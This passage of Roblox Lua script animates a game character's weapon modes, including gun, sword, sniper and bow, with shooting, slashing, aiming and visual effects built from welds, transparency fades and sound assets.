if v.className=="Part" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
effect.Parent=nil
end),v)
end
end
wait(0.5)
gwld1.Part1=LeftArm
gwld1.C0=euler(1.57+0.5,0,-1.57)*cf(0,1,0)
for i=0,1,0.1 do
wait()
gwld1.C0=euler(1.57+0.5,0,-1.57+1.57*i)*cf(0,1,0)
RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.5*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.5-1*i,0,0.2+0.4*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
end
attack=false
end
 
function Sword()
attack=true
Mode="Sword"
swld1.Part1=LeftArm
swld1.C0=euler(0,0,-1.57)*cf(0,1,0)
swld1.C1=euler(0,0,0)
coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3) 
numb=0.5
for i=0,1,0.1 do
wait()
Cone.Transparency=numb
Screen1.Transparency=numb
Screen2.Transparency=numb
Screen3.Transparency=numb
numb=numb+0.1
end
Cone.Parent=nil
Screen1.Parent=nil
Screen2.Parent=nil
Screen3.Parent=nil
end),cone,screen1,screen2,screen3)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
sword.Parent=modelzorz
for e=1,#SwordWelds do
SwordWelds[e].Parent=modelzorz
end
for _,v in pairs(sword:children()) do
if v.className=="Part" and v.Name~="Hitbox" and v.Name~="Mid" then
v.Transparency=1
end
end
for _,v in pairs(sword:children()) do
if v.className=="Part" and v.Name~="Hitbox" and v.Name~="Mid" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part) 
wait(0.5)
Part.Transparency=0
end),v)
end
end
effect=sword:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" and v.Name~="Hitbox" and v.Name~="Mid" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
effect.Parent=nil
end),v)
end
end
wait(0.5)
for i=0,1,0.1 do
wait()
swld1.C0=euler(0,-1.57*i,1.57-3.14*i)*cf(0,1,0)
swld1.C1=euler(0,1.57*i,0)
RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.5*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(1.5-1.5*i,0,0.2-0.6*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function Sniper()
attack=true
Mode="Sniper"
snwld1.Part1=LeftArm
snwld1.C0=euler(0.5,0,0)*cf(0,1.6,-2)
coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3) 
numb=0.5
for i=0,1,0.1 do
wait()
Cone.Transparency=numb
Screen1.Transparency=numb
Screen2.Transparency=numb
Screen3.Transparency=numb
numb=numb+0.1
end
Cone.Parent=nil
Screen1.Parent=nil
Screen2.Parent=nil
Screen3.Parent=nil
end),cone,screen1,screen2,screen3)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
sniper.Parent=modelzorz
for e=1,#SniperWelds do
SniperWelds[e].Parent=modelzorz
end
for _,v in pairs(sniper:children()) do
if v.className=="Part" then
v.Transparency=1
end
end
for _,v in pairs(sniper:children()) do
if v.className=="Part" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part) 
wait(0.5)
Part.Transparency=0
end),v)
end
end
effect=sniper:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
effect.Parent=nil
end),v)
end
end
wait(0.5)
gwld1.Part1=LeftArm
snwld1.C0=euler(0.5,0,0)*cf(0,1.6,-2)
snwld1.C1=cf(0,0,0)
for i=0,1,0.1 do
wait()
snwld1.C0=euler(0.5+1.57*i,0,0)*cf(0,1.6-0.6*i,-2+2*i)
RW.C0=cf(1, 0.3, -0.8+0.3*i) * euler(1.27-0.37*i,0,-1.3+1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+2.3*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57-0.5*i,0,0.2+0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function Shoot()
attack=true
Humanoid.WalkSpeed=2
Bg.Parent=Head
Bg.cframe=Head.CFrame
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(0,0,0.785*i)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(0.5+1.07*i,0,0.6-1.385*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57-1.57*i,0)
end
spread=1
range=50
rangepower=70
while hold==true and Bullets~=0 do
for i=1,5 do
wait(0.05)
Bullets=Bullets-1
so("http://roblox.com/asset/?id=10209257",gprt16,0.5,1+math.random()) 
coroutine.resume(coroutine.create(function()
for z = 1 ,2 do
coroutine.resume(coroutine.create(function()
local meshb1 = Instance.new("BlockMesh")
meshb1.Scale = Vector3.new(1,1,1)
light = Instance.new("PointLight")
light.Brightness = .8
light.Color = Color3.new(100,50,0)
light.Range = 10
local shellb1 = Instance.new("Part")
light.Parent = shellb1
meshb1.Parent = shellb1
shellb1.Anchored = true
shellb1.formFactor = 3
shellb1.Size = Vector3.new(0.3,0.3,0.3) * (math.random(100,300)/100)
shellb1.CFrame = CFrame.new((gprt16.CFrame * CFrame.new(0,-gprt16.Size.y/2,0)).p) * CFrame.Angles(math.random(-100,100)/100,math.random(-100,100)/100,math.random(-100,100)/100)
shellb1.Parent = Character
shellb1.Transparency = 0
if math.random(1,2) == 1 then
shellb1.BrickColor = BrickColor.new("Bright red")
else
shellb1.BrickColor = BrickColor.new("Bright orange")
end
shellb1.CanCollide = false
local incre = math.random(0,60)/100
for i = 0 , 1 , 0.1 do
wait()
light.Brightness = light.Brightness - .1
shellb1.CFrame = shellb1.CFrame + Head.CFrame.lookVector*incre
shellb1.Transparency = 1*i
meshb1.Scale = Vector3.new(1+1*i,1+1*i,1+1*i)
end
shellb1.Parent=nil
end))
end
end))
shoottrail(MMouse.Hit.p,gprt16,5,1,1)
LW.C1=cf(0, 0.5, 0) * euler(-0.2,0,0)
wait(0.05)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
end
spread=0
range=500
rangepower=50
if Bullets==0 then
for i=0,1,0.2 do
wait(0)
gwld13.C0=cf(0,0,0.3)*euler(0,1.57-1.57*i,0)
end
wait(0.2)
Humanoid.WalkSpeed=16
Bg.Parent=nil
for i=0,1,0.1 do
wait()
gwld1.C0=euler(1.57+0.5,0,-1.57*i)*cf(0,1,0)
Neck.C0=necko*euler(0.3*i,0,0.785-0.785*i)
RW.C0=cf(1.5-0.5*i, 0.5, -0.5*i) * euler(1.2*i,0,0.2-0.4*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.2+0.2*i, 0.5, -0.3-0.2*i) * euler(1.57-0.57*i,0,-0.785+0.785*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for i=0,1,0.1 do
wait()
gwld20.C0=cf(0.3*i,-0.8-0.2*i,0)*euler(0,0,1.57*i)
RW.C0=cf(1, 0.5, -0.5) * euler(1.2-0.3*i,0,-0.2-0.1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(0.3+0.2*i,0,-0.5*i)
RW.C0=cf(1+0.5*i, 0.5, -0.5+0.5*i) * euler(0.9-1.3*i,0,-0.3)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
local ammo=Instance.new("Model")
ammo.Parent=modelzorz
ammo.Name="Ammo"
local aprt1=part(3,ammo,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
local amsh1=mesh("CylinderMesh",aprt1,"","",vt(0,0,0),vt(0.7,0.2,0.7))
local awld1=weld(aprt1,aprt1,RightArm,cf(0,1,0))
numb=0
for i=1,10 do
local aprt2=part(3,ammo,0,0,BrickColor.new("Bright yellow"),"Part2",vt(1,1,1))
local amsh2=mesh("CylinderMesh",aprt2,"","",vt(0,0,0),vt(0.2,0.3,0.2))
local awld2=weld(aprt2,aprt2,aprt1,cf(0.2,0.1,0)*euler(0,numb,0))
numb=numb+0.628
end
for i=0,1,0.2 do
wait()
awld1.C0=euler(1.57,0,0)*cf(0,1+0.1*i,0)
Neck.C0=necko*euler(0.5-0.2*i,0,-0.5+0.5*i)
RW.C0=cf(1.5-0.5*i, 0.5, -0.5*i) * euler(-0.4+1.5*i,0,-0.3-0.1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
ammo.Parent=nil
for i=0,1,0.2 do
wait()
gwld20.C0=cf(0.3-0.3*i,-0.8-0.2+0.2*i,0)*euler(0,0,1.57-1.57*i)
Neck.C0=necko*euler(0.3-0.1*i,0,-0.2*i)
RW.C0=cf(1.5-0.5, 0.5, -0.5) * euler(1.1+0.1*i,0,-0.4+0.4*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for i=0,1,0.1 do
wait()
gwld1.C0=euler(1.57+0.5,0,-1.57+1.57*i)*cf(0,1,0)
gwld13.C0=cf(0,0,0.3)*euler(0,1.57*i,0)
Neck.C0=necko*euler(0.2-0.2*i,0,-0.2+0.2*i)
RW.C0=cf(1.5-0.5+0.5*i, 0.5, -0.5+0.5*i) * euler(1.2-1.2*i,0,0.2*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1-0.2*i, 0.5, -0.5+0.2*i) * euler(1-0.5*i,0,0.6*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
end
Bullets=10
else
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0,0,0.785-0.785*i)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57-1.57*i,0,-0.785+1.385*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
end
Neck.C0=necko
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(0.5,0,0.6)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
end
Bg.Parent=nil
Humanoid.WalkSpeed=16
attack=false
end
 
function slash1()
attack=true
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(-0.4*i,0,-0.4-0.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1*i,0)
end
Bg.Parent=Head
Bg.cframe=Head.CFrame
con1=sprt16.Touched:connect(function(hit) Damagefunc1(hit,20,10) end) 
so("http://roblox.com/asset/?id=10209640",LeftArm,1,1) 
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(0,0,0.785*i)
swld1.C0=euler(0.5*i,-1.57,-1.57)*cf(0,1,0)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5+0.5*i, 0.5, -0.5*i) * euler(-0.4+2.4*i,0,-0.6+1.4*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1,0)
end
for i=0,1,0.1 do
wait()
--[[Neck.C0=necko*euler(0,0,0.785*i)
swld1.C0=euler(0.5*i,-1.57,-1.57)*cf(0,1,0)]]
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5+0.5, 0.5, -0.5) * euler(2,0,0.8+0.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1,0)
end
con1:disconnect()
wait()
attack=false
end
 
function slash2()
attack=true
CF=Head.CFrame
con1=sprt16.Touched:connect(function(hit) Damagefunc1(hit,10,10) end) 
so("http://roblox.com/asset/?id=10209640",LeftArm,1,1.5) 
for i=0,1,0.2 do
wait()
swld1.C0=euler(0.5-0.5*i,-1.57,-1.57)*cf(0,1,0)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1-0.5*i, 0.5, -0.5+0.5*i) * euler(2-0.43*i,0,1-2.57*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1+.57*i,0)
Bg.cframe=CF*euler(0,3.14*i,0)
end
so("http://roblox.com/asset/?id=10209640",LeftArm,1,1.5) 
for i=0,1,0.2 do
wait()
swld1.C0=euler(-0.5*i,-1.57,-1.57)*cf(0,1,0)
Bg.cframe=CF*euler(0,3.14+3.14*i,0)
end
con1:disconnect()
wait()
attack=false
end
 
function slash3()
attack=true
Bg.Parent=nil
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0,0,0.785-0.785*i)
swld1.C0=euler(-0.5+0.5*i,-1.57,-1.57)*cf(0,1,0)
RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57+.43*i,0,-1.57+1*i)
LW.C1=cf(0, 0.5, 0) * euler(0,1.57-2.07*i,0)
end
con1=sprt16.Touched:connect(function(hit) Damagefunc1(hit,20,10) end) 
so("http://roblox.com/asset/?id=10209640",LeftArm,1,0.9) 
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(0.3*i,0,-0.2*i)
swld1.C0=euler(-0.3*i,-1.57,-1.57)*cf(0,1,0)
RW.C0=cf(1.5, 0.5, 0) * euler(-0.5*i,0,0.2+0.2*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5+1.5*i, 0.5-0.2*i, -1*i) * euler(2-1.5*i,0,-.57+1.07*i)
LW.C1=cf(0, 0.5, 0) * euler(0,-.5,0)
end
for i=0,1,0.1 do
wait()
RW.C0=cf(1.5, 0.5, 0) * euler(-0.5,0,0.4)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(0, 0.3, -1) * euler(.5-.2*i,0,.5)
LW.C1=cf(0, 0.5, 0) * euler(0,-.5,0)
end
con1:disconnect()
wait()
attack=false
end
 
function BowShoot()
attack=true
BowAim=true
HeadNumb=0
Humanoid.WalkSpeed=2
coroutine.resume(coroutine.create(function(FenNeck) 
while BowAim==true do
wait()
local pos4 = vt(workspace.CurrentCamera.CoordinateFrame.X,Head.Position.Y,workspace.CurrentCamera.CoordinateFrame.Z)
Bg.cframe = cf(Head.Position,pos4) * euler(0,3.14-HeadNumb,0) * cf(0,0,0) --cf(Torso.Position,MMouse.Hit.p) * 
Bg.Parent = Torso
offset=(Torso.Position.y-MMouse.Hit.p.y)/60
mag=(Torso.Position-MMouse.Hit.p).magnitude/80
offset=offset/mag 
FenNeck.C1=necko2*euler(-offset,0,0)
end
end),Neck)
for i=0,1,0.1 do
wait()
HeadNumb=1.57*i
swld1.C0=euler(0,-1.57+0.3*i,-1.57)*cf(0,1,0)
Neck.C0=necko*euler(0,0,HeadNumb)
RW.C0=cf(1.5-2.5*i, 0.5, -1*i) * euler(1.57*i,0,0.2-1.97*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57*i,0,-0.4-0.87*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
 
local string1=part(3,sword,0,1,BrickColor.new("Bright yellow"),"String1",vt(0.5,1,0.5))
local stringmsh1=mesh("CylinderMesh",string1,"","",vt(0,0,0),vt(0.1,1,0.1))
local stringwld1=weld(string1,string1,prt17,euler(0,0,0)*cf(0,0,0))
local string2=part(3,sword,0,1,BrickColor.new("Bright yellow"),"String2",vt(0.5,1,0.5))
local stringmsh2=mesh("CylinderMesh",string2,"","",vt(0,0,0),vt(0.1,1,0.1))
local stringwld2=weld(string2,string2,prt19,euler(0,0,0)*cf(0,0,0))
table.insert(SwordWelds,stringwld1)
table.insert(SwordWelds,stringwld1)
coroutine.resume(coroutine.create(function(String1,String2)
for i=0,1,0.1 do
wait()
String1.Transparency=String1.Transparency-0.05
String2.Transparency=String2.Transparency-0.05
end
end),string1,string2)
 
local strmdl = "Arrow"
coroutine.resume(coroutine.create(function()
arrowdebounce=false
repeat
wait(0)
coroutine.resume(coroutine.create(function()
if arrowdebounce==false then
so("http://www.roblox.com/asset/?id=10756118",sprt18,1,1) 
Lightning(sprt17.Position,sprt18.Position,3,0.2,"Bright yellow",0.00001,0.4)
Lightning(sprt19.Position,sprt18.Position,3,0.2,"Bright yellow",0.00001,0.4)
arrowdebounce=true
wait(0.1)
arrowdebounce=false
end
end))
local top = sprt17.CFrame
local bottom = sprt19.CFrame
local oristrpos
if strmdl == "Bow" then
oristrpos = CFrame.new((top.p+bottom.p)/2)
elseif strmdl == "Arrow" then
oristrpos = sprt18.CFrame
end
local mg1 = (top.p - oristrpos.p).magnitude
local mg2 = (bottom.p - oristrpos.p).magnitude
stringmsh1.Scale=vt(0.1,mg1,0.1)
basecf=sprt17.CFrame
cff=CFrame.new(sprt17.CFrame*angles(1.57,0,0).p,sprt18.Position)*angles(math.rad(90),0,0)*cf(0,-mg1/2,0)
hit2=string1
hit=sprt18
stringwld1.Parent=string1
stringwld1.Part0=hit2
stringwld1.Part1=hit
HitPos=cff.p
local CJ = CFrame.new(HitPos)
local C0=cff:inverse() *CJ 
local C1=hit.CFrame:inverse() * CJ 
stringwld1.C0=C0
stringwld1.C1=C1
 
stringmsh2.Scale=vt(0.1,mg2,0.1)
cff2=CFrame.new(sprt18.CFrame*angles(1.57,0,0).p,sprt19.Position)*angles(math.rad(90),0,0)*cf(0,-mg2/2,0)
hit3=string2
hit2=sprt18
stringwld2.Parent=string2
stringwld2.Part0=hit3
stringwld2.Part1=hit2
HitPos2=cff2.p
local CJ2 = CFrame.new(HitPos2)
local C02=cff2:inverse() *CJ 
local C12=hit2.CFrame:inverse() * CJ 
stringwld2.C0=C02
stringwld2.C1=C12
until string1.Parent==nil
end))
swld18.Part1=RightArm
swld18.C0=cf(0,1,0)
local arrow=part(3,sword,0,1,BrickColor.new("Bright yellow"),"Arrow",vt(1,1,1))
local arrowmsh=mesh("SpecialMesh",arrow,"FileMesh","http://www.roblox.com/asset/?id=15887356",vt(0,0,0),vt(1,1,2))
arrowmsh.VertexColor=vt(1,1,1)
local arrowwld=weld(arrow,arrow,sprt18,euler(-1.57,0,0)*cf(0,1,0))
for i=0,1,0.1 do
wait()
arrow.Transparency=arrow.Transparency-0.05
arrowwld.C0=euler(-1.57,0,0)*cf(0,1,0)*euler(0,0,0.15*i)
RW.C0=cf(1.5-2.5+2*i, 0.5, -1) * euler(1.57,0,-1.77+0.2*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57,0,-1.27)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
while BowAim==true do
wait(0)
end
so("http://www.roblox.com/asset/?id=16211041",prt18,1,1) 
spread=0
range=500
rangepower=100
shoottrail(MMouse.Hit.p,arrow,30,10,2)
Humanoid.WalkSpeed=0
arrow.Parent=nil
swld18.Part0=sprt18
swld18.Part1=sprt1
swld18.C0=cf(0,0,-0.8)
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(-0.2*i,0,HeadNumb)
RW.C0=cf(1, 0.5, -1) * euler(1.57,0,-1.57)
RW.C1=cf(0, 0.5, 0) * euler(-0.4*i,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57,0,-1.27)
LW.C1=cf(0, 0.5, 0) * euler(-0.4*i,0,0)
end
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.2-0.1*i,0,HeadNumb)
RW.C0=cf(1, 0.5, -1) * euler(1.57,0,-1.57)
RW.C1=cf(0, 0.5, 0) * euler(-0.4-0.1*i,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57,0,-1.27)
LW.C1=cf(0, 0.5, 0) * euler(-0.4-0.1*i,0,0)
end
string1.Parent=nil
string2.Parent=nil
BowAim=false
Humanoid.WalkSpeed=16
Bg.Parent=nil
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3+0.3*i,0,HeadNumb-HeadNumb*i)
RW.C0=cf(1+0.5*i, 0.5, -1+1*i) * euler(1.57-1.57*i,0,-1.57+1.77*i)
RW.C1=cf(0, 0.5, 0) * euler(-0.5+0.5*i,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(1.57-1.57*i,0,-1.27+1.07*i)
LW.C1=cf(0, 0.5, 0) * euler(-0.5+0.5*i,0,0)
end
spread=0
range=500
rangepower=50
Neck.C1=necko2
Neck.C0=necko
attack=false
end
 
function Aim()
attack=true
Humanoid.WalkSpeed=5
Bg.Parent=Torso
Bg.cframe=Head.CFrame
CF=Torso.CFrame
for i=0,1,0.1 do
wait()
Bg.cframe=CF*euler(0,0.785*i,0)
Neck.C0=necko*euler(0,0,-0.785*i)
Neck.C1=necko2*euler(0,-0.5*i,0)
RW.C0=cf(1+0.2*i, 0.3, -0.5-0.2*i) * euler(0.9+0.6*i,0,-0.3+0.1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.3+0.27*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.07+0.5*i,0,0.7+0.085*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
 
function UnAim()
attack=true
Humanoid.WalkSpeed=16
for i=0,1,0.1 do
wait()
Bg.cframe=CF*euler(0,0.785-0.785*i,0)
Neck.C0=necko*euler(0,0,-0.785+0.785*i)
Neck.C1=necko2*euler(0,-0.5+0.5*i,0)
RW.C0=cf(1.2-0.2*i, 0.3, -0.7+0.2*i) * euler(1.5-0.6*i,0,-0.2-0.1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57-0.27*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57-0.5*i,0,0.785-0.085*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
Bg.Parent=nil
attack=false
end
 
function SniperShoot()
attack=true
spread=0
range=1000
rangepower=100
shoottrail(MMouse.Hit.p,snprt15,20,20,0.5)
coroutine.resume(coroutine.create(function()
for z = 1 ,4 do
coroutine.resume(coroutine.create(function()
local meshb1 = Instance.new("BlockMesh")
meshb1.Scale = Vector3.new(1,1,1)
light = Instance.new("PointLight")
light.Brightness = .8
light.Color = Color3.new(100,50,0)
light.Range = 10
local shellb1 = Instance.new("Part")
light.Parent = shellb1
meshb1.Parent = shellb1
shellb1.Anchored = true
shellb1.formFactor = 3
shellb1.Size = Vector3.new(0.3,0.3,0.3) * (math.random(100,300)/100)
shellb1.CFrame = CFrame.new((snprt15.CFrame * CFrame.new(0,-snprt15.Size.y/2,0)).p) * CFrame.Angles(math.random(-100,100)/100,math.random(-100,100)/100,math.random(-100,100)/100)
shellb1.Parent = Character
shellb1.Transparency = 0
if math.random(1,2) == 1 then
shellb1.BrickColor = BrickColor.new("Bright red")
else
shellb1.BrickColor = BrickColor.new("Bright orange")
end
shellb1.CanCollide = false
local incre = math.random(0,60)/100
HCF=Head.CFrame.lookVector
for i = 0 , 1 , 0.02 do
wait()
light.Brightness = light.Brightness - .02
shellb1.CFrame = shellb1.CFrame + HCF*incre
shellb1.Transparency = 1*i
meshb1.Scale = Vector3.new(1+1*i,1+1*i,1+1*i)
end
shellb1.Parent=nil
end))
end
end))
so("http://roblox.com/asset/?id=10209875",snprt15,1,0.8) 
for i=0,1,0.3 do
wait()
Neck.C0=necko*euler(-0.3*i,0,-0.785)
RW.C0=cf(1.2, 0.3, -0.7) * euler(1.5+0.3*i,0,-0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.785)
LW.C1=cf(0, 0.5, 0) * euler(-0.3*i,0,0)
end
for i=0,1,0.2 do
wait()
Neck.C0=necko*euler(-0.3-0.1*i,0,-0.785)
RW.C0=cf(1.2, 0.3, -0.7) * euler(1.5+0.3+0.1*i,0,-0.2)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.785)
LW.C1=cf(0, 0.5, 0) * euler(-0.3-0.1*i,0,0)
end
Humanoid.WalkSpeed=16
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.4+0.6*i,0,-0.785+0.785*i)
Neck.C1=necko2*euler(0,-0.5+0.5*i,0)
RW.C0=cf(1.2, 0.3, -0.7) * euler(1.9-0.6*i,0,-0.2-0.4*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.785-0.185*i)
LW.C1=cf(0, 0.5, 0) * euler(-0.4+0.8*i,0,0)
end
so("http://roblox.com/asset/?id=10209881",snprt15,1,1) 
local ammo=part(3,workspace,0,0,BrickColor.new("Bright yellow"),"Ammo",vt(1,1,1))
ammo.CanCollide=true
ammomsh=mesh("CylinderMesh",ammo,"","",vt(0,0,0),vt(0.15,0.2,0.15))
local cfrf = snprt25.CFrame * CFrame.fromEulerAnglesXYZ(0,1.57,0)
local cfr = cfrf + cfrf.lookVector * -0.5
ammo.CFrame = cfr
ammo.RotVelocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
ammo.Velocity = cfr.lookVector * 20
coroutine.resume(coroutine.create(function(Part) 
wait(10)
Part.Parent=nil
end),ammo)
for i=0,1,0.2 do
wait()
snwld26.C1=euler(0,0,1*i)
RW.C0=cf(1.2, 0.3, -0.7-0.4*i) * euler(1.3,0,-0.6+0.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
end
for i=0,1,0.2 do
wait()
snwld26.C1=euler(0,0,1-1*i)
RW.C0=cf(1.2, 0.3, -0.7-0.4+0.4*i) * euler(1.3,0,-0.6+0.3-0.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
end
Humanoid.WalkSpeed=5
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0.2-0.2*i,0,-0.785*i)
Neck.C1=necko2*euler(0,-0.5*i,0)
RW.C0=cf(1.2, 0.3, -0.7) * euler(1.3+0.2*i,0,-0.6+0.4*i)
RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.6+0.185*i)
LW.C1=cf(0, 0.5, 0) * euler(0.4-0.4*i,0,0)
end
spread=0
range=500
rangepower=50
attack=false
end
 
function RemoveDrones()
attack=true
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.5*i,0,0)
RW.C0=cf(1.5, 0.5, 0) * euler(0.5+2.64*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for _,v in pairs(modelzorz:children()) do
if v.Name=="Drone" then
print("FoundDrone")
for _,s in pairs(v:children()) do
if s.className=="Part" then
s.Anchored=true
coroutine.resume(coroutine.create(function(Part,Model) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.1
end
wait()
Model.Parent=nil
end),s,v)
end
end
end
end
wait(1)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.5+0.5*i,0,0)
RW.C0=cf(1.5, 0.5, 0) * euler(3.14-3.14*i,0,0)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2+0.2*i)
